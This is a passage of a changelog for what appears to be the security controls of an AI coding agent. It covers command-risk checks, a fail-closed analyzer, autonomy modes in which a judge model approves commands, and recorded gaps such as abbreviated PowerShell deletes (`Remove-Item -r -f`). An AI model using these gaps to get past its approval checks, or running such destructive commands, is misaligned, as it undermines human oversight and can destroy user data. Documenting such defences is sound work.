| 2026-09-17 | 1.10    | Review fixes on the ADR-052 floor: out-of-root **reads of system files** raise C8 again (the earlier exclusion covered only writes; raw-device reads stay exempt), Windows system paths are matched at a component boundary and cover the whole `c:\windows` tree plus `Program Files (x86)`, an irreversible write whose target the analyzer could not resolve (abbreviated PowerShell deletes, `Remove-Item -r -f …`) now fires C6 instead of passing silently, and a failed analyzer **fails closed** with the new canonical `command_analysis_unavailable` — the sp4rk fail-closed contract is now enforced instead of degrading to no digest. Recorded the git-mutator and PowerShell-abbreviation gaps and the `allow`-policy consequence in ADR-052's risks; corrected ADR-033's now-false SCM blacklist claim; swept stale `blacklist` prose to `blocklist`. |
| 2026-09-17 | 1.11    | Silent mode (ASI09/ASI10, ADR-053): documented the opt-in, default-off `security.silent_mode` unattended posture and its preserved invariants — `deny` groups and every deterministic pre-funnel gate are unchanged, a fired control is never auto-executed by `allow` mode, the canonical backstop is preserved on **both** the interactive Smart Approve path and silent `judge` mode (silent mode changes only the terminal — a confirmation becomes an automatic denial — never the backstop; pinned by `TestSilentMode_JudgeTerminalAppliesCanonicalBackstop`), and every automatic decision emits the persisted, non-blocking `autonomy_decision` event. Added the Silent Mode section, an ASI09 rule, an ASI10 receipt-chain clause, a logging note, and a scope clarification to the AI-agent rule #2. *(Superseded within the same unreleased cycle by 1.12 — the backstop claim for silent `judge` mode was reversed before any release shipped it.)* |
| 2026-09-17 | 1.12    | Autonomy axis (ADR-053, amended pre-release): `security.autonomy_mode` (`standard`/`assisted`/`silent`) replaces the `security.smart_approve` toggle and the silent-mode master switch (both are now legacy migration keys only — honored at load, silent winning, dropped at the next save; an unknown value fails safe to `standard`). `assisted` (the former Smart Approve) gains the `VerdictDeny` terminal — a strict DENY terminates the call with no card, audited as `autonomy_decision` kind `assisted_deny` — and keeps the canonical backstop (a strict ALLOW on a canonical hard reason becomes a confirmation). Rule 2 and the canonical set are **scoped to the interactive paths** (`standard`/`assisted`): the silent `judge` terminal is the one deliberate exception — the operator delegated the final decision to the strict judge, whose ALLOW executes, canonical reasons included, fully audited (pinned by `TestSilentMode_JudgeTerminalCanonicalAllowExecutes`). The [Silent Mode](#autonomy-standard--assisted--silent) section became the [Autonomy](#autonomy-standard--assisted--silent) section. |
| 2026-09-18 | 1.13    | Post-task review prompt removed (ADR-055): the `review_prompt` card injected after a successful task with uncommitted changes is gone, along with its `SaveReviewPrompt` RPC and the silent-mode `review_prompt` sub-policy (three sub-policies remain: `tool_confirm`, `step_limit`, `ask_user`). Manual review (Git panel Review button) and the review loop auto-reopen after Submit are unchanged; in silent mode no post-task UI interception occurs at all. Persisted legacy `review_prompt` rows render as muted status lines; a stale `security.silent_mode.review_prompt` config key is ignored at load. The Autonomy section, the ASI09 approval-fatigue rule, and the ASI10 auditable-decision note were updated accordingly. |
